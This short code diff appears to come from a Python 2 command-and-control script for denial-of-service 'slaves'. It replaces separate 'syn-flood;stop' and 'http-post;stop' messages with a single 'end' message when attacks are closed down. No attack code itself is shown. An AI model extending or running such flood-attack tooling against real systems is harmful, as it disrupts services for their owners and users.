@@ -89,8 +89,7 @@ if __name__ == '__main__':
         print "\nKeyboard interruption detected"
 
     print "Closing possible ongoing attacks..."
-    sendMsgToSlaves("syn-flood;stop", sock)
-    sendMsgToSlaves("http-post;stop", sock)
+    sendMsgToSlaves("end", sock)
 
     sock.close()
 
